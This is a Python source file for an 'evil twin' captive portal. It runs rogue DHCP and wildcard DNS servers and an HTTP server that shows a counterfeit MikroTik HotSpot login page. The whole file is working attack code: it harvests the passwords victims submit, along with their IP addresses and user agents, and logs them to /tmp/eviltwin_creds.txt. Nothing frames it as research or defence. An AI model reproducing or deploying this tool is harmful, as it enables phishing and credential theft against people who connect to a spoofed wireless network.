import socket
import struct
import threading
import time
import datetime
import os
import json
import urllib.parse
from typing import Optional

MIKROTIK_LOGO = """<svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg">
<rect x="5" y="5" width="50" height="50" rx="8" fill="#0073CF"/>
<rect x="12" y="12" width="14" height="14" rx="3" fill="#fff" opacity="0.9"/>
<rect x="34" y="12" width="14" height="14" rx="3" fill="#fff" opacity="0.9"/>
<rect x="12" y="34" width="14" height="14" rx="3" fill="#fff" opacity="0.9"/>
<rect x="34" y="34" width="14" height="14" rx="3" fill="#fff" opacity="0.9"/>
<text x="70" y="30" font-family="Arial,sans-serif" font-weight="bold" font-size="22" fill="#333">MIKROTIK</text>
<text x="70" y="48" font-family="Arial,sans-serif" font-size="12" fill="#666">HotSpot Gateway</text>
</svg>"""

FAKE_LOGIN_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MikroTik Hotspot Login</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Tahoma,Verdana,Arial,sans-serif;background:#e8e8e8;display:flex;align-items:center;justify-content:center;min-height:100vh}
.login-box{background:#fff;width:420px;padding:30px 35px;box-shadow:0 2px 10px rgba(0,0,0,0.15);border-radius:2px}
.logo{text-align:center;margin-bottom:20px}
.logo svg{max-width:220px;height:auto}
h2{text-align:center;color:#333;font-size:16px;font-weight:400;margin-bottom:6px}
.ssid-label{text-align:center;font-size:13px;color:#888;margin-bottom:20px}
.ssid-label strong{color:#333;font-weight:700}
table{width:100%}
td{padding:6px 4px;font-size:13px;color:#444;vertical-align:middle}
td.label{width:90px;text-align:right;padding-right:10px;white-space:nowrap;font-weight:700;color:#333}
td.input{width:auto}
input[type="text"],input[type="password"]{width:100%;padding:7px 8px;border:1px solid #bbb;font-size:13px;font-family:Tahoma,sans-serif;background:#fff;color:#333}
input[type="text"]:focus,input[type="password"]:focus{outline:none;border-color:#0073CF;box-shadow:0 0 3px rgba(0,115,207,0.3)}
.btn-row{text-align:center;padding-top:12px}
.btn{background:#0073CF;color:#fff;border:none;padding:8px 40px;font-size:14px;font-family:Tahoma,sans-serif;cursor:pointer;border-radius:2px;text-transform:uppercase;font-weight:700;letter-spacing:0.5px}
.btn:hover{background:#005AA3}
.btn:active{background:#004A8A}
.info{text-align:center;margin-top:16px;font-size:11px;color:#999;line-height:1.6}
.info span{display:block}
.status{text-align:center;margin-top:12px;padding:8px;font-size:12px;display:none;border-radius:2px}
.status.error{display:block;background:#FFF0F0;color:#C00;border:1px solid #FCC}
.status.success{display:block;background:#F0FFF0;color:#090;border:1px solid #CFC}
.info-line{text-align:center;font-size:11px;color:#aaa;margin-top:16px;padding-top:10px;border-top:1px solid #eee}
.footer-text{text-align:center;font-size:10px;color:#bbb;margin-top:5px}
</style>
</head>
<body>
<div class="login-box">
<div class="logo">""" + MIKROTIK_LOGO + """</div>
<h2>HotSpot Login</h2>
<div class="ssid-label">SSID: <strong>SSID_NAME</strong></div>
<form id="loginForm" method="POST" action="/login">
<table>
<tr><td class="label">Username</td><td class="input"><input type="text" id="username" name="username" placeholder="" required></td></tr>
<tr><td class="label">Password</td><td class="input"><input type="password" id="password" name="password" placeholder="" required></td></tr>
<tr><td></td><td class="btn-row"><button type="submit" class="btn" id="loginBtn">Upload</button></td></tr>
</table>
</form>
<div class="status" id="statusMsg"></div>
<div class="info">
<span>You must log in to access the Internet.</span>
<span>Please enter your username and password.</span>
</div>
<div class="info-line">MikroTik RouterOS v7.14 | HotSpot Gateway</div>
<div class="footer-text">&copy; 2024 MikroTik. All rights reserved.</div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();
var btn=document.getElementById('loginBtn');var msg=document.getElementById('statusMsg');
btn.disabled=true;btn.textContent='Connecting...';msg.className='status';msg.textContent='';
var data=new URLSearchParams();Array.from(new FormData(this).entries()).forEach(function(p){data.append(p[0],p[1])});
fetch(this.action,{method:'POST',body:data,headers:{'Content-Type':'application/x-www-form-urlencoded'}})
.then(function(r){return r.text()}).then(function(){
msg.className='status success';msg.textContent='Connected! You can now access the Internet.';
setTimeout(function(){window.location.href='/'},2000);
}).catch(function(){msg.className='status error';
msg.textContent='Login failed. Check your username and password.';btn.disabled=false;btn.textContent='Upload'})});
</script>
</body>
</html>"""

SUCCESS_PAGE = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>MikroTik - Connected</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Tahoma,Verdana,Arial,sans-serif;background:#e8e8e8;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#fff;width:400px;padding:40px;box-shadow:0 2px 10px rgba(0,0,0,0.15);text-align:center;border-radius:2px}
.icon{width:64px;height:64px;border-radius:50%;background:#0073CF;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
.icon svg{width:36px;height:36px;fill:#fff}
h2{color:#333;font-size:18px;margin-bottom:8px}
p{color:#666;font-size:13px;line-height:1.6;margin-bottom:16px}
.loader{width:32px;height:32px;border:3px solid #e0e0e0;border-top-color:#0073CF;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
<div class="icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>Authentication Successful</h2>
<p>You are now connected to the network.<br>Redirecting to gateway...</p>
<div class="loader"></div>
</div>
<script>setTimeout(function(){window.location.href='/';},2500)</script>
</body>
</html>"""


class CaptivePortal:
    def __init__(self, iface: str, gateway_ip: str = "192.168.1.1",
                 subnet_mask: str = "255.255.255.0", dns_ip: str = "192.168.1.1"):
        self.iface = iface
        self.gateway_ip = gateway_ip
        self.subnet_mask = subnet_mask
        self.dns_ip = dns_ip
        self.ssid = ""

        self._running = False
        self._captured_passwords: list[dict] = []
        self._lock = threading.Lock()

        self._dhcp_thread: Optional[threading.Thread] = None
        self._dns_thread: Optional[threading.Thread] = None
        self._http_thread: Optional[threading.Thread] = None

        self._dhcp_sock: Optional[socket.socket] = None
        self._dns_sock: Optional[socket.socket] = None
        self._http_sock: Optional[socket.socket] = None

        self._lease_start = 100
        self._lease_end = 200
        self._leases: dict[str, str] = {}
        self._lease_counter = self._lease_start

    def set_ssid(self, ssid: str):
        self.ssid = ssid

    # ── DHCP Server ──────────────────────────────────────────────

    def _dhcp_server(self):
        self._dhcp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._dhcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._dhcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self._dhcp_sock.bind(("0.0.0.0", 67))

        while self._running:
            try:
                data, addr = self._dhcp_sock.recvfrom(1024)
                self._handle_dhcp(data, addr)
            except OSError:
                if self._running:
                    continue
                break

    def _handle_dhcp(self, data: bytes, addr: tuple):
        if len(data) < 240:
            return

        op = data[0]
        if op != 1:
            return

        xid = data[4:8]
        chaddr = data[28:34]
        magic = data[236:240]

        if magic != b'\x63\x82\x53\x63':
            return

        options = self._parse_dhcp_options(data[240:])
        dhcp_type = options.get(53)

        if dhcp_type == 1:
            self._send_dhcp_offer(xid, chaddr, addr)
        elif dhcp_type == 3:
            self._send_dhcp_ack(xid, chaddr, addr, options)

    def _parse_dhcp_options(self, data: bytes) -> dict[int, bytes]:
        options = {}
        i = 0
        while i < len(data):
            tag = data[i]
            if tag == 255:
                break
            if tag == 0:
                i += 1
                continue
            if i + 1 >= len(data):
                break
            length = data[i + 1]
            if i + 2 + length > len(data):
                break
            options[tag] = data[i + 2:i + 2 + length]
            i += 2 + length
        return options

    def _allocate_ip(self, chaddr: bytes) -> str:
        mac_hex = ":".join(f"{b:02x}" for b in chaddr)
        if mac_hex in self._leases:
            return self._leases[mac_hex]

        ip_parts = self.gateway_ip.split(".")
        base = ".".join(ip_parts[:3])
        if self._lease_counter > self._lease_end:
            self._lease_counter = self._lease_start

        assigned = f"{base}.{self._lease_counter}"
        self._lease_counter += 1
        self._leases[mac_hex] = assigned
        return assigned

    def _build_dhcp_packet(self, xid: bytes, chaddr: bytes, yiaddr: str,
                           message_type: int) -> bytes:
        ip_bytes = socket.inet_aton(yiaddr)
        gw_bytes = socket.inet_aton(self.gateway_ip)
        dns_bytes = socket.inet_aton(self.dns_ip)
        mask_bytes = socket.inet_aton(self.subnet_mask)

        bootp = struct.pack("!B", 2)
        bootp += struct.pack("!B", 1)
        bootp += struct.pack("!B", 6)
        bootp += struct.pack("!B", 0)
        bootp += struct.pack("!I", 0)
        bootp += struct.pack("!I", 0)
        bootp += struct.pack("!I", 0)
        bootp += xid
        bootp += struct.pack("!H", 0)
        bootp += struct.pack("!H", 0)
        bootp += struct.pack("!I", 0)
        bootp += gw_bytes
        bootp += ip_bytes
        bootp += socket.inet_aton("0.0.0.0")
        bootp += gw_bytes
        bootp += chaddr + b"\x00" * 10
        bootp += b"\x00" * 64
        bootp += b"\x00" * 128
        bootp += b"\x63\x82\x53\x63"

        options = b""
        options += struct.pack("!BB", 53, 1) + struct.pack("!B", message_type)
        options += struct.pack("!BB", 1, 4) + mask_bytes
        options += struct.pack("!BB", 3, 4) + gw_bytes
        options += struct.pack("!BB", 6, 4) + dns_bytes
        lease_sec = struct.pack("!I", 600)
        options += struct.pack("!BB", 51, 4) + lease_sec
        options += struct.pack("!BB", 54, 4) + gw_bytes
        options += b"\xff"

        return bootp + options

    def _send_dhcp_offer(self, xid: bytes, chaddr: bytes, addr: tuple):
        yiaddr = self._allocate_ip(chaddr)
        pkt = self._build_dhcp_packet(xid, chaddr, yiaddr, 2)
        self._dhcp_sock.sendto(pkt, ("255.255.255.255", 68))

    def _send_dhcp_ack(self, xid: bytes, chaddr: bytes, addr: tuple,
                       options: dict):
        requested_ip = options.get(50)
        yiaddr = self._allocate_ip(chaddr)
        if requested_ip:
            try:
                yiaddr = socket.inet_ntoa(requested_ip)
            except OSError:
                pass
        pkt = self._build_dhcp_packet(xid, chaddr, yiaddr, 5)
        self._dhcp_sock.sendto(pkt, ("255.255.255.255", 68))

    # ── DNS Server ───────────────────────────────────────────────

    def _dns_server(self):
        self._dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._dns_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._dns_sock.bind(("0.0.0.0", 53))

        while self._running:
            try:
                data, addr = self._dns_sock.recvfrom(1024)
                self._handle_dns(data, addr)
            except OSError:
                if self._running:
                    continue
                break

    def _handle_dns(self, data: bytes, addr: tuple):
        if len(data) < 12:
            return

        tid = data[0:2]
        flags = struct.unpack("!H", data[2:4])[0]
        qr = (flags >> 15) & 1

        if qr == 1:
            return

        qdcount = struct.unpack("!H", data[4:6])[0]
        if qdcount == 0:
            return

        offset = 12
        qname_parts = []
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if length & 0xC0 == 0xC0:
                offset += 2
                break
            offset += 1
            part = data[offset:offset + length]
            qname_parts.append(part.decode("utf-8", errors="replace"))
            offset += length

        qname = ".".join(qname_parts)
        qtype = struct.unpack("!H", data[offset:offset + 2])[0]
        qclass = struct.unpack("!H", data[offset + 2:offset + 4])[0]

        response = self._build_dns_response(tid, data[2:4], qname, qtype,
                                             qclass)
        self._dns_sock.sendto(response, addr)

    def _build_dns_response(self, tid: bytes, query_flags: bytes, qname: str,
                            qtype: int, qclass: int) -> bytes:
        flags = 0x8180
        pkt = tid
        pkt += struct.pack("!H", flags)
        pkt += struct.pack("!H", 1)
        pkt += struct.pack("!H", 1)
        pkt += struct.pack("!H", 0)
        pkt += struct.pack("!H", 0)

        for part in qname.split("."):
            pkt += struct.pack("!B", len(part))
            pkt += part.encode("utf-8", errors="replace")
        pkt += b"\x00"
        pkt += struct.pack("!HH", qtype, qclass)

        pkt += b"\xC0\x0C"
        pkt += struct.pack("!H", qtype)
        pkt += struct.pack("!H", qclass)
        ttl = struct.pack("!I", 60)
        pkt += ttl

        ip_bytes = socket.inet_aton(self.dns_ip)

        if qtype == 1:
            rdlength = 4
            pkt += struct.pack("!H", rdlength)
            pkt += ip_bytes
        elif qtype == 28:
            pkt += struct.pack("!H", 16)
            pkt += b"\x00" * 16
        elif qtype == 15:
            mx_data = struct.pack("!H", 10)
            for part in qname.split("."):
                mx_data += struct.pack("!B", len(part))
                mx_data += part.encode("utf-8", errors="replace")
            mx_data += b"\x00"
            pkt += struct.pack("!H", len(mx_data))
            pkt += mx_data
        elif qtype == 16:
            txt_data = b"\x0chello\x00world"
            pkt += struct.pack("!H", len(txt_data))
            pkt += txt_data
        else:
            rdlength = 4
            pkt += struct.pack("!H", rdlength)
            pkt += ip_bytes

        return pkt

    # ── HTTP Server ──────────────────────────────────────────────

    def _http_server(self):
        self._http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._http_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._http_sock.settimeout(1.0)
        self._http_sock.bind(("0.0.0.0", 80))
        self._http_sock.listen(128)

        while self._running:
            try:
                conn, addr = self._http_sock.accept()
                t = threading.Thread(target=self._handle_http,
                                     args=(conn, addr), daemon=True)
                t.start()
            except socket.timeout:
                continue
            except OSError:
                if self._running:
                    continue
                break

    def _handle_http(self, conn: socket.socket, addr: tuple):
        try:
            conn.settimeout(10.0)
            data = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data:
                    more = data.count(b"\r\n\r\n")
                    if more > 0:
                        break

            if not data:
                conn.close()
                return

            request = data.decode("utf-8", errors="replace")
            lines = request.split("\r\n")
            if not lines:
                conn.close()
                return

            first_line = lines[0]
            parts = first_line.split(" ")
            if len(parts) < 2:
                conn.close()
                return

            method = parts[0]
            path = parts[1]

            headers = {}
            body = ""
            blank_idx = request.find("\r\n\r\n")
            if blank_idx >= 0:
                header_section = request[:blank_idx]
                body = request[blank_idx + 4:]
                for line in header_section.split("\r\n")[1:]:
                    if ":" in line:
                        k, v = line.split(":", 1)
                        headers[k.strip().lower()] = v.strip()

            if method == "POST":
                self._capture_http_post(path, body, headers, addr)

            if method == "POST":
                html = SUCCESS_PAGE.encode("utf-8")
                resp = (
                    "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/html; charset=utf-8\r\n"
                    "Content-Length: {}\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                ).format(len(html)).encode("utf-8") + html
            else:
                page = self._build_login_page()
                html = page.encode("utf-8")
                resp = (
                    "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/html; charset=utf-8\r\n"
                    "Content-Length: {}\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                ).format(len(html)).encode("utf-8") + html

            conn.sendall(resp)
        except Exception:
            pass
        finally:
            conn.close()

    def _build_login_page(self) -> str:
        ssid = self.ssid or "WiFi Network"
        return FAKE_LOGIN_PAGE.replace("SSID_NAME", ssid, 1)

    def _capture_http_post(self, path: str, body: str, headers: dict,
                           addr: tuple):
        params = {}
        ct = headers.get("content-type", "")
        if "application/x-www-form-urlencoded" in ct:
            for part in body.split("&"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    k = urllib.parse.unquote_plus(k)
                    v = urllib.parse.unquote_plus(v)
                    params[k] = v
        elif "application/json" in ct:
            try:
                params = json.loads(body)
            except json.JSONDecodeError:
                params["raw"] = body
        else:
            for part in body.split("&"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    k = urllib.parse.unquote_plus(k)
                    v = urllib.parse.unquote_plus(v)
                    params[k] = v

        password = (params.get("password") or params.get("pass") or
                    params.get("passwd") or "")
        if password:
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            entry = {
                "timestamp": ts,
                "ssid": self.ssid,
                "password": password,
                "client_ip": addr[0],
                "client_port": addr[1],
                "path": path,
                "user_agent": headers.get("user-agent", ""),
            }
            with self._lock:
                self._captured_passwords.append(entry)

            log_line = f"[{ts}] SSID={self.ssid} PASSWORD={password} IP={addr[0]}\n"
            try:
                with open("/tmp/eviltwin_creds.txt", "a") as f:
                    f.write(log_line)
            except OSError:
                pass

    # ── Public API ───────────────────────────────────────────────

    def start(self):
        if self._running:
            return

        self._running = True

        self._dhcp_thread = threading.Thread(target=self._dhcp_server,
                                             daemon=True)
        self._dhcp_thread.start()

        self._dns_thread = threading.Thread(target=self._dns_server,
                                            daemon=True)
        self._dns_thread.start()

        self._http_thread = threading.Thread(target=self._http_server,
                                             daemon=True)
        self._http_thread.start()

    def stop(self):
        self._running = False

        if self._dhcp_sock:
            try:
                self._dhcp_sock.close()
            except OSError:
                pass
            self._dhcp_sock = None

        if self._dns_sock:
            try:
                self._dns_sock.close()
            except OSError:
                pass
            self._dns_sock = None

        if self._http_sock:
            try:
                self._http_sock.close()
            except OSError:
                pass
            self._http_sock = None

    def get_captured_passwords(self) -> list[dict]:
        with self._lock:
            return list(self._captured_passwords)
